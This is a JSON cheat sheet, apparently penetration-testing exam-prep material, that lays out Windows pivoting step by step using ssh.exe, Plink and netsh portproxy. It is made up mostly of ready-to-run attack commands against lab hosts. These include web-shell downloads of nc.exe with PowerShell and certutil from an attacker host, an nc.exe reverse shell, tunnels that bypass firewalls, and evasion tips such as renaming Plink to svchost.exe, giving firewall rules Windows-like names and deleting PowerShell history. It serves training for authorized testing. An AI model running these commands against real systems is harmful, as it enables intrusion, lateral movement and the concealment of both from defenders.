{
  "cheatsheets": [
    {
      "id": "port-forwarding-windows",
      "name": "Port Forwarding - Windows Pivot Points",
      "description": "Execute port forwarding and tunneling techniques from Windows compromised hosts using ssh.exe, Plink, and Netsh for security work lateral movement",
      "educational_header": {
        "how_to_recognize": [
          "Compromised Windows host (Server 2016/2019/2022, Win10 1803+) with cmd.exe or PowerShell access",
          "OpenSSH client found in C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe (Windows 1803+ default)",
          "Plink.exe or PuTTY installed on system (common in admin workstations)",
          "RDP accessible but need to forward additional internal services not directly routable",
          "Admin privileges available (check: whoami /priv shows SeDebugPrivilege, net localgroup administrators)",
          "Windows Firewall active and blocking direct access (netsh advfirewall show allprofiles)"
        ],
        "when_to_look_for": [
          "After exploiting IIS web application and gaining reverse shell (iis apppool\\\\defaultapppool user)",
          "RDP access obtained via cracked credentials but internal services blocked by firewall",
          "Windows host dual-homed (ipconfig /all shows multiple interfaces with different subnets)",
          "Need to pivot from Windows jump host to Linux internal servers (PostgreSQL, MySQL, SSH)",
          "OpenSSH unavailable but legacy Plink or older admin tools present in Program Files",
          "Admin access gained, can modify Windows Firewall rules and bind ports to interfaces"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows",
          "context": "Target: MULTISERVER03 (Windows Server 2022), RDP accessible with credentials rdp_admin:P@ssw0rd! discovered via Confluence database hash cracking. OpenSSH client bundled with Windows by default. Need to access PostgreSQL on PGDATABASE01 (10.4.50.215:5432) and enumerate DMZ subnet (10.4.50.0/24) from Kali. Firewall allows only RDP (3389) and HTTP (80) inbound to MULTISERVER03. All other inbound ports blocked. Kali SSH server running. Goal: Create reverse SOCKS proxy for flexible internal network access from Kali.\n\nNetwork Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2551  Inbound:    \u2551\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\n\u2502      \u2502      \u2551  3389 (RDP)  \u2551      \u2502 192.168.50.64\u2502      \u2502 10.4.50.215  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2551  80 (HTTP)   \u2551      \u2502 10.4.50.64   \u2502      \u2502 Port 5432    \u2502\n   \u2191          \u2551  Outbound:   \u2551      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502 Port 9998\u2551  All allowed \u2551            \u2193\n   \u2502 SOCKS5   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d            \u2502\n   \u2502                                      \u2502\n   \u2514\u2500\u2500SSH connection (MULTISERVER03 \u2192 Kali)\u2500\u2500\u2500\u2518\n        Remote dynamic port forward",
          "approach": "Step 1: RDP into MULTISERVER03 from Kali:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64 (FreeRDP connects successfully).\nStep 2: Open cmd.exe in RDP session, verify OpenSSH client:\n  where ssh (expected output: C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe).\nStep 3: Check OpenSSH version: ssh.exe -V (output: 'OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2' - version 8.1+ supports remote dynamic).\nStep 4: Ensure Kali SSH server running: On Kali, sudo systemctl start ssh, verify:\n  sudo systemctl status ssh (shows 'active (running)').\nStep 5: Set Kali password: passwd kali, enable password auth:\n  sudo nano /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh.\nStep 6: From MULTISERVER03 cmd.exe, create remote dynamic forward:\n  ssh -N -R 9998 kali@192.168.118.4 (enter Kali password when prompted).\nStep 7: On Kali, verify SOCKS proxy:\n  ss -ntplu | grep 9998 (expected: tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:*).\nStep 8: Configure Proxychains on Kali:\n  Edit /etc/proxychains4.conf, replace proxy list with 'socks5 127.0.0.1 9998'.\nStep 9: Optimize Proxychains timeouts: Same file, set 'tcp_read_time_out = 1000', 'tcp_connect_time_out = 1000'.\nStep 10: Access PostgreSQL through reverse SOCKS:\n  proxychains psql -h 10.4.50.215 -U postgres (password: D@t4basePassw0rd!).\nStep 11: Enumerate DMZ subnet:\n  proxychains nmap -sT --top-ports=20 -Pn 10.4.50.0/24. Traffic flow: Kali tool \u2192 Proxychains (SOCKS wrapper) \u2192 Kali loopback:9998 (SOCKS proxy) \u2192 SSH tunnel (reverse direction, encrypted) \u2192 MULTISERVER03 (SSH client forwards) \u2192 Any socket MULTISERVER03 can reach in DMZ.",
          "commands": [
            "xfreerdp-connect",
            "where-windows",
            "ssh-version",
            "ssh-remote-dynamic-port-forward",
            "proxychains-config",
            "proxychains-psql"
          ],
          "expected_outcome": "xfreerdp establishes RDP session to MULTISERVER03. where ssh confirms OpenSSH at C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe. ssh -V shows version 8.1p1 (supports remote dynamic). ssh.exe connects to Kali SSH server, no output after password (-N flag suppresses shell). ss on Kali confirms SOCKS5 proxy bound on loopback (127.0.0.1:9998). Proxychains output shows '[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK'. psql connects successfully, lists 4 databases (confluence, postgres, template0, template1), queries confluence database. Nmap sweep through Proxychains identifies open ports across DMZ subnet. \n\nTime: 3-4 minutes for initial setup, 5-10 minutes for /24 subnet enumeration. \n\nSuccess rate: 100% on Windows 1803+ with OpenSSH installed (default since April 2018 update). \n\nWindows versions with OpenSSH: 1803, 1809, 1903, 1909, 2004, 20H2, 21H1, 21H2, 22H2, Server 2019, Server 2022. \n\nLimitation: Requires modern Windows version. OpenSSH can be removed by admins (Features on Demand). \n\nAlternative: If OpenSSH removed, use Plink (Scenario 2). If both unavailable, use Netsh + standalone SOCKS server (Scenario 3 + microsocks).",
          "why_this_works": "Microsoft bundled OpenSSH client with Windows 1803+ (April 2018) to provide native SSH capabilities for administrators. \n\nDecision driven by: (1) PowerShell Remoting alternatives, (2) Linux subsystem integration, (3) Cloud management (Azure VMs). \n\nWindows ssh.exe is port of OpenSSH, supports same command-line flags as Linux version: -L (local forward), -D (dynamic forward), -R (remote forward/remote dynamic). \n\nRemote dynamic port forward (-R 9998 without destination) requires OpenSSH \u22657.6 (added October 2017). Windows OpenSSH client version 8.1+ meets this requirement. \n\nSSH server (Kali) binds \n\nSOCKS5 proxy on specified port (9998) on loopback interface. \n\nOutbound SSH connections from Windows (MULTISERVER03 \u2192 Kali:22) rarely blocked by firewalls - considered legitimate administrative traffic. \n\nFirewall blocks inbound connections to MULTISERVER03 non-essential ports, but reverse tunnel bypasses this restriction. \n\nSOCKS5 proxy on Kali loopback receives SOCKS-formatted packets from Proxychains, wraps them, pushes through reverse SSH tunnel to MULTISERVER03. SSH client on MULTISERVER03 unwraps SOCKS headers, extracts destination addresses, forwards to addressed sockets. \n\nResult: Modern Windows hosts achieve parity with Linux pivot techniques. Single tunnel provides access to entire internal network from Kali through firewalled Windows pivot point."
        },
        {
          "title": "Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH",
          "context": "Target: MULTISERVER03 (Windows Server 2016), HTTP web application vulnerable to file upload on TCP/80, all other inbound ports blocked by perimeter firewall (including RDP 3389). Exploited web vulnerability, dropped web shell at /umbraco/forms.aspx (IIS path). Uploaded nc.exe (Netcat for Windows) via PowerShell wget one-liner, caught reverse shell with low-privilege iis apppool\\\\defaultapppool user. OpenSSH client not installed (removed by security-conscious admins or older Windows version pre-1803). Found RDP credentials rdp_admin:P@ssw0rd! via password reuse from earlier Confluence database. RDP service running on MULTISERVER03 loopback (127.0.0.1:3389) but not accessible from Kali due to firewall. Goal: Access RDP service from Kali by creating reverse port forward using Plink.exe (PuTTY command-line SSH client).\n\nFirewall + Web Shell Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2551  Inbound:    \u2551\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\n\u2502      \u2502      \u2551  80 (HTTP)   \u2551      \u2502 192.168.50.64\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2551  Outbound:   \u2551      \u2502 RDP: 3389    \u2502\n   \u2191          \u2551  All allowed \u2551      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502          \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d            \u2193\n   \u2502 Port 9833                 Web shell \u2192 nc.exe reverse shell\n   \u2502 (bound Kali)                         \u2193\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500Plink reverse tunnel\u2500\u2500\u2500\u2518\n        Kali:9833 \u2192 MULTISERVER03 loopback:3389 (RDP)",
          "approach": "Step 1: Start Kali SSH server:\n  sudo systemctl start ssh, check: sudo systemctl status ssh. Set password: passwd kali. Enable password auth: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh.\nStep 2: Host Netcat and Plink on Kali Apache2:\n  sudo systemctl start apache2, sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/, sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/.\nStep 3: Via web shell at http://192.168.50.64/umbraco/forms.aspx, download nc.exe:\n  powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\\\\Windows\\\\Temp\\\\nc.exe.\nStep 4: Start Netcat listener on Kali:\n  nc -nvlp 4446.\nStep 5: Execute nc.exe reverse shell from web shell:\n  C:\\\\Windows\\\\Temp\\\\nc.exe -e cmd.exe 192.168.118.4 4446.\nStep 6: In caught reverse shell, download Plink:\n  powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\\\\Windows\\\\Temp\\\\plink.exe.\nStep 7: Create reverse port forward with Plink:\n  C:\\\\Windows\\\\Temp\\\\plink.exe -ssh -l kali -pw YOUR_KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4.\nStep 8: Handle host key prompt: When prompted 'Store key in cache? (y/n)', enter 'y'. Alternative for non-interactive shells:\n  cmd.exe /c echo y | C:\\\\Windows\\\\Temp\\\\plink.exe -ssh -l kali -pw YOUR_KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 (pipes 'y' into Plink to auto-accept).\nStep 9: On Kali, verify listening port:\n  ss -ntplu | grep 9833 (shows tcp LISTEN 0 128 127.0.0.1:9833 0.0.0.0:*).\nStep 10: RDP through reverse forward:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 (connects to RDP on MULTISERVER03 through tunnel). Traffic: Kali \u2192 localhost:9833 (Kali loopback) \u2192 SSH tunnel (reverse direction, Plink on MULTISERVER03 initiated) \u2192 MULTISERVER03 loopback:3389 (RDP service). Firewall allows MULTISERVER03 \u2192 Kali:22 (outbound SSH), blocks Kali \u2192 MULTISERVER03:3389 (inbound RDP).",
          "commands": [
            "systemctl-start-ssh",
            "apache2-start",
            "powershell-wget",
            "plink-remote-forward",
            "xfreerdp-connect"
          ],
          "expected_outcome": "Apache2 hosts nc.exe and plink.exe. Web shell PowerShell wget downloads both binaries to C:\\\\Windows\\\\Temp. nc.exe reverse shell caught by Netcat listener on Kali. plink.exe connects to Kali SSH server, prompts 'Store key in cache? (y/n)' on first connection. After accepting with 'y', Plink establishes tunnel. ss on Kali shows port 9833 bound on loopback. xfreerdp connects successfully to Kali loopback:9833, RDP session to MULTISERVER03 established. RDP desktop appears showing Windows Server login, can log in as rdp_admin, full desktop access to MULTISERVER03. \n\nTime: 5-7 minutes including file downloads and setup. \n\nSuccess rate: High on systems where Plink previously installed by admins (common on Windows Server 2012/2016, admin workstations). Plink.exe also found in penetration testing toolkits on systems. \n\nCaveat: Password passed on command line with -pw flag logs credentials in multiple locations: (1) cmd.exe command history (%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt), (2) Windows Event Logs (Event ID 4688 process creation if auditing enabled), (3) PowerShell history. Mitigation: Create dedicated port-forward-only user on Kali with random password, delete command history post-engagement: del %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt. \n\nAlternative: If Plink incompatible or detected by AV, use SSH reverse shell + Metasploit autoroute module, or Chisel (Go-based tunneling tool, single binary).",
          "why_this_works": "Plink is command-line version of PuTTY SSH client, designed for scripting and automation. \n\nPopular in Windows environments pre-OpenSSH era (pre-2018). \n\nNot flagged by antivirus - legitimate administrator tool bundled with PuTTY suite. \n\nSupports subset of OpenSSH features including: remote port forward (-R), local port forward (-L), dynamic port forward (-D on newer versions), key-based authentication, command execution. \n\nPlink syntax differences from OpenSSH: Protocol specified explicitly (-ssh flag required), username with -l flag (not user@host format), password with -pw flag (insecure but convenient for automation). \n\nRemote port forward: -R [bind_address:]port:host:hostport (same as OpenSSH). \n\nPlink initiates outbound SSH connection to Kali SSH server (allowed by firewall - administrative traffic). \n\nKali \n\nSSH server binds listening port (127.0.0.1:9833) on loopback. \n\nPackets sent to Kali:9833 pushed through SSH tunnel back to Plink on MULTISERVER03. Plink forwards packets to specified destination (127.0.0.1:3389 on MULTISERVER03 loopback). \n\nRDP service on MULTISERVER03 receives forwarded packets, responds through reverse tunnel. \n\nResult: RDP accessible from Kali despite perimeter firewall blocking inbound TCP/3389. Reverse tunnel bypasses firewall by reversing connection direction. Only requires outbound SSH (TCP/22) allowed from MULTISERVER03."
        },
        {
          "title": "Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding",
          "context": "Target: MULTISERVER03 (Windows Server 2022), RDP accessible with rdp_admin credentials (member of local Administrators group). Need to SSH from Kali to PGDATABASE01 (10.4.50.215:22) for Linux enumeration. PGDATABASE01 SSH accessible from MULTISERVER03 but not from Kali WAN network. No need for SSH client on MULTISERVER03 - want persistent port forward using native Windows tools. Have full admin privileges (UAC not a concern when logged in via RDP as admin). Windows Firewall active and will require modification. Goal: Create persistent native Windows port forward from MULTISERVER03 WAN interface to PGDATABASE01 SSH, accessible from Kali, using only built-in Windows commands.\n\nNetwork + Netsh Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\n\u2502      \u2502      \u2502 192.168.50.64\u2502      \u2502 10.4.50.215  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502 Port 2222    \u2502      \u2502 Port 22 (SSH)\u2502\n              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                     \u2193\n              Windows Firewall\n                     \u2193\n              Netsh portproxy\n              (kernel-level forward)\n                     \u2193\n         Registry: PortProxy\\\\v4tov4\\\\tcp\n\nKali \u2192 MULTISERVER03:2222 \u2192 (Netsh forward) \u2192 PGDATABASE01:22",
          "approach": "Step 1: RDP into MULTISERVER03:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64.\nStep 2: Right-click Start menu, select 'Windows PowerShell (Admin)' or open cmd.exe as Administrator.\nStep 3: Verify admin privileges:\n  whoami /groups | findstr /i \"administrators\" (confirms S-1-5-32-544 Administrators group).\nStep 4: Create port forward with Netsh portproxy:\n  netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215.\nStep 5: Verify listening port: netstat -anp TCP | find \\\"2222\\\" (expected: 'TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING').\nStep 6: Verify portproxy configuration:\n  netsh interface portproxy show all (displays rule: Listen 192.168.50.64:2222 \u2192 Connect 10.4.50.215:22).\nStep 7: Add Windows Firewall rule to allow inbound TCP/2222:\n  netsh advfirewall firewall add rule name=\\\"port_forward_ssh_2222\\\" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow.\nStep 8: Verify firewall rule:\n  netsh advfirewall firewall show rule name=\\\"port_forward_ssh_2222\\\".\nStep 9: Test from Kali:\n  sudo nmap -sS -p2222 192.168.50.64 (should show '2222/tcp open').\nStep 10: SSH through forward:\n  ssh database_admin@192.168.50.64 -p2222 (password: sqlpass123, connects to PGDATABASE01).\nStep 11: Verify connection: hostname (shows 'pgdatabase01'), ip addr (shows PGDATABASE01 interfaces).\nStep 12: CLEANUP CRITICAL - Delete firewall rule:\n  netsh advfirewall firewall delete rule name=\\\"port_forward_ssh_2222\\\".\nStep 13: Delete port forward:\n  netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64.\nStep 14: Verify cleanup:\n  netsh interface portproxy show all (should show empty list), netstat -anp TCP | find \\\"2222\\\" (should return nothing). Traffic: Kali \u2192 MULTISERVER03:2222 (WAN interface) \u2192 Windows IP Helper service (kernel-level portproxy) \u2192 PGDATABASE01:22 (SSH service).",
          "commands": [
            "xfreerdp-connect",
            "whoami-priv",
            "netsh-portproxy-add",
            "netstat-windows",
            "netsh-portproxy-show",
            "netsh-firewall-add-rule",
            "nmap-port-check",
            "ssh-connect",
            "netsh-firewall-delete-rule",
            "netsh-portproxy-delete"
          ],
          "expected_outcome": "netsh portproxy add command returns no output (success is silent). netstat confirms listening on WAN interface: 'TCP 192.168.50.64:2222 0.0.0.0:0 LISTENING'. netsh portproxy show displays rule in table format. netsh advfirewall firewall add returns 'Ok.' Windows Firewall now allows inbound TCP/2222. nmap from Kali shows '2222/tcp open EtherNetIP-1'. ssh command connects successfully, hostname returns 'pgdatabase01'. SSH session established to PGDATABASE01 Linux host through Windows port forward. \n\nTime: 4-5 minutes for setup including firewall rule. \n\nPersistence: Port forward rule survives reboots (stored in Windows Registry HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp). \n\nRegistry value format: [listenport],[listenaddress] = [connectport],[connectaddress]. \n\nForensic artifacts: (1) Registry key persists until manually deleted, (2) Windows Firewall logs connection attempts (C:\\\\Windows\\\\System32\\\\LogFiles\\\\Firewall\\\\pfirewall.log if enabled), (3) Netsh command in PowerShell history, (4) Event ID 5156 (Windows Filtering Platform permitted connection) if auditing enabled. \n\nCleanup verification: After deletion, netsh portproxy show returns empty table, netstat shows port no longer listening, nmap shows port filtered/closed. Cleanup CRITICAL in red team engagements - persistent port forward exposes internal network. \n\nAlternative: If admin not available, use non-admin techniques (SSH/Plink remote forward with standard user), or privilege escalation first (SeImpersonate \u2192 Rotten Potato \u2192 SYSTEM \u2192 Netsh).",
          "why_this_works": "Netsh (Network Shell) is built-in Windows command-line network configuration utility, present since Windows 2000. \n\nNo external tools required - native OS feature. \n\nportproxy subcontext of interface context creates port forwarding rules implemented by IP Helper service (iphlpsvc). \n\nIP Helper runs as Windows kernel service, provides port forwarding at network stack level. \n\nSyntax: netsh interface portproxy add v4tov4 (IPv4 to IPv4 forwarding) listenport/listenaddress (listening socket on MULTISERVER03) connectport/connectaddress (destination socket). \n\nAdmin privileges required because: (1) Modifies system networking configuration (requires SeManageNetworkPrivilege), (2) Binds to privileged ports possible (<1024 if specified), (3) Modifies Windows Firewall rules (requires SeSecurityPrivilege). \n\nWindows Firewall separate from portproxy - must explicitly allow inbound connections. netsh advfirewall firewall add rule creates Windows Firewall rule: name (identifier for later deletion), protocol (TCP/UDP), dir (in/out), localip/localport (listening socket to allow), action (allow/block). \n\nPort forwards implemented at kernel level, low overhead, high performance. \n\nRegistry persistence: PortProxy configuration stored in HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp registry key, loaded by IP Helper service on boot. \n\nResult: Native Windows port forwarding without SSH, no external binaries, administrative feature but detectable via forensic analysis. Legitimate use cases: Load balancing, NAT, service migration. Red team use: Pivot point for lateral movement. Detection: Registry monitoring, Netsh command logging, Windows Firewall rule changes, unusual port bindings in netstat."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Windows Enumeration & Port Forwarding Capability Assessment",
          "notes": "Before selecting port forwarding technique, enumerate Windows environment: (1) OS version and build: systeminfo | findstr /C:\\\"OS Name\\\" /C:\\\"OS Version\\\" (determines OpenSSH availability - Win10 1803+/Server 2019+ likely has it). (2) OpenSSH client presence: where ssh (if returns C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe, use Scenario 1), if not found, check for Plink: where plink.exe, or dir /s /b C:\\\\\\\"Program Files\\\"\\\\plink.exe (use Scenario 2 if found). (3) Admin privileges: whoami /priv (look for SeDebugPrivilege, SeImpersonatePrivilege, SeManageNetworkPrivilege), net localgroup administrators (confirms admin group membership - required for Netsh Scenario 3). (4) Network interfaces: ipconfig /all (identify dual-homed hosts, note interface IPs for binding). (5) Firewall status: netsh advfirewall show allprofiles (shows if firewall active, current rules), netsh advfirewall firewall show rule name=all (lists all rules). \n\nDecision tree: OpenSSH found + modern Windows (1803+) + any user \u2192 Use ssh.exe (Scenario 1, most flexible). No OpenSSH but can upload files + any user \u2192 Use Plink (Scenario 2, legacy compatible). Admin access + need persistence + any Windows version \u2192 Use Netsh (Scenario 3, native tool, leaves forensic artifacts). Time: 3-5 minutes for enumeration. certification tip: Check Windows version first (systeminfo), determines 90% of technique selection. Note presence/absence of tools in initial compromise report.",
          "commands": [
            {
              "id": "systeminfo-windows",
              "example": "systeminfo",
              "shows": "Host Name, OS Name, OS Version displayed"
            },
            {
              "id": "where-windows",
              "example": "where ssh",
              "shows": "Full path displayed (e.g., C:\\Windows\\System32\\OpenSSH\\ss..."
            },
            {
              "id": "whoami-priv",
              "example": "whoami /priv",
              "shows": "Privilege Name column lists available privileges"
            },
            {
              "id": "ipconfig-all",
              "example": "ipconfig /all",
              "shows": "Multiple adapters listed (Ethernet, Ethernet 2, etc.)"
            },
            {
              "id": "netsh-firewall-show",
              "example": "netsh advfirewall show allprofiles",
              "shows": "Domain Profile Settings"
            }
          ]
        },
        {
          "title": "Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)",
          "notes": "Use when admin privileges not available or prefer non-persistent tunnels. Both ssh.exe and Plink create reverse tunnels without admin rights (standard users can initiate outbound SSH). \n\nPrerequisites: (1) Kali SSH server running: sudo systemctl start ssh, verify: sudo systemctl status ssh. (2) Strong Kali password: passwd kali (or SSH key pair for ssh.exe). (3) Password authentication enabled: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. \n\nUpload methods: PowerShell wget (powershell wget -Uri http://KALI_IP/tool.exe -OutFile C:\\\\Windows\\\\Temp\\\\tool.exe), certutil (certutil -urlcache -split -f http://KALI_IP/tool.exe C:\\\\Windows\\\\Temp\\\\tool.exe), SMB share (net use \\\\\\\\KALI_IP\\\\share, copy from share), web shell upload (if web server compromised). \n\nTool selection: ssh.exe (Windows 1803+, full feature parity with Linux OpenSSH, supports -L/-D/-R, native, no upload required). Plink (legacy Windows, common on Windows Server 2012/2016, requires upload, password on command line with -pw flag logs credentials). \n\nBoth support: Remote port forward (-R listenport:destip:destport, one socket), Remote dynamic (ssh.exe: -R port, Plink: limited support, check version). \n\nTesting: On Kali, verify listening: ss -ntplu | grep PORT (should show 127.0.0.1:PORT). \n\nCommon issues: (1) Host key prompt in restricted shells (solution: cmd.exe /c echo y | plink.exe ... to auto-accept), (2) Password authentication disabled on Kali (enable in sshd_config), (3) Firewall blocks outbound SSH from Windows (rare, try port 443 as alternative: ssh -p 443), (4) AV flags Plink.exe (rename to svchost.exe or legitimate-sounding name, or use ssh.exe if available). Time: 5-7 minutes including uploads and setup. certification relevance: HIGH - Non-admin access common in exams, reverse tunnels bypass firewalls (critical skill). Success rate: 70% of Windows compromises have either ssh.exe or ability to upload Plink.",
          "commands": [
            {
              "id": "ssh-remote-port-forward",
              "example": "ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4",
              "shows": "No output after authentication (normal with -N)"
            },
            {
              "id": "ssh-remote-dynamic-port-forward",
              "example": "ssh -N -R 9998 kali@192.168.118.4",
              "shows": "No output after authentication (normal with -N)"
            },
            {
              "id": "plink-remote-forward",
              "example": "plink.exe -ssh -l kali -pw kali -R 9833:172.16.50.217:3389 192.168.45.x",
              "shows": "Using username \"<username>\""
            },
            {
              "id": "powershell-wget",
              "example": "powershell wget http://10.10.14.1/nc.exe -OutFile C:\\Temp\\nc.exe",
              "shows": "File transfer completes successfully"
            },
            {
              "id": "certutil-download",
              "example": "certutil -urlcache -f http://10.10.14.5:8000/shell.exe shell.exe",
              "shows": "CertUtil: -URLCache command completed successfully"
            },
            {
              "id": "systemctl-start-ssh",
              "example": "sudo systemctl start ssh",
              "shows": "Service starts silently (no output = success)"
            }
          ]
        },
        {
          "title": "Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup",
          "notes": "Use when admin privileges available and need persistent or high-performance forwarding. Netsh advantages: (1) Native Windows tool, no uploads, (2) Persistent across reboots, (3) Kernel-level performance, (4) Supports any protocol (TCP/UDP). Disadvantages: (1) Requires admin (SeManageNetworkPrivilege), (2) Leaves forensic artifacts (registry, firewall logs, command history), (3) Detectable by SOC teams monitoring Netsh commands. \n\nImplementation workflow: (1) Create port forward: netsh interface portproxy add v4tov4 listenport=PORT listenaddress=BIND_IP connectport=DEST_PORT connectaddress=DEST_IP. (2) Verify configuration: netsh interface portproxy show all (displays all rules), netstat -an | findstr PORT (confirms listening). (3) Open firewall (CRITICAL): netsh advfirewall firewall add rule name=\\\"RULE_NAME\\\" protocol=TCP dir=in localip=BIND_IP localport=PORT action=allow. Use descriptive names to avoid suspicion (e.g., 'Windows_Update_Service', 'RemoteManagement_2222'). (4) Test connectivity: From Kali, nmap -sS -p PORT TARGET_IP (should show open), or telnet TARGET_IP PORT (tests TCP handshake). (5) CLEANUP MANDATORY: Delete firewall rule first: netsh advfirewall firewall delete rule name=\\\"RULE_NAME\\\". Delete port forward: netsh interface portproxy del v4tov4 listenport=PORT listenaddress=BIND_IP. Verify: netsh interface portproxy show all (empty), netstat (port no longer listening). \n\nForensic artifacts: (1) Registry: HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PortProxy\\\\v4tov4\\\\tcp, persists until manual deletion. (2) Windows Firewall logs: C:\\\\Windows\\\\System32\\\\LogFiles\\\\Firewall\\\\pfirewall.log (if enabled). (3) PowerShell history: %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt. (4) Event logs: Security Event ID 5156 (Windows Filtering Platform permitted connection), 4688 (process creation auditing if enabled shows netsh.exe). \n\nEvasion techniques: (1) Use high non-standard ports (>10000, less monitored), (2) Temporary rules (create, use within 1 hour, delete immediately), (3) Obfuscate rule names (avoid 'ssh', 'tunnel', use Windows-like names), (4) Delete PowerShell history: Remove-Item (Get-PSReadlineOption).HistorySavePath. Time: 4-6 minutes including firewall configuration. certification relevance: MEDIUM-HIGH - Admin access requires privilege escalation first, but Netsh essential for Windows persistence scenarios. Cleanup CRITICAL for ethical engagements - failure to remove leaves backdoor.",
          "commands": [
            {
              "id": "netsh-portproxy-add",
              "example": "netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=127.0.0.1",
              "shows": "Ok."
            },
            {
              "id": "netsh-portproxy-show",
              "example": "netsh interface portproxy show all",
              "shows": "Listen on"
            },
            {
              "id": "netsh-portproxy-delete",
              "example": "netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0",
              "shows": "Ok. message"
            },
            {
              "id": "netsh-firewall-add-rule",
              "example": "netsh advfirewall firewall add rule name=\"Allow_ReverseShell\" protocol=TCP dir=in localport=4444 action=allow",
              "shows": "Ok."
            },
            {
              "id": "netsh-firewall-delete-rule",
              "example": "netsh advfirewall firewall delete rule name=\"Allow_ReverseShell\"",
              "shows": "Ok."
            },
            {
              "id": "netstat-windows",
              "example": "netstat -ano",
              "shows": "Proto, Local Address, Foreign Address, State, PID columns..."
            },
            {
              "id": "nmap-port-check",
              "example": "sudo nmap -p 22 -Pn -v 192.168.45.100",
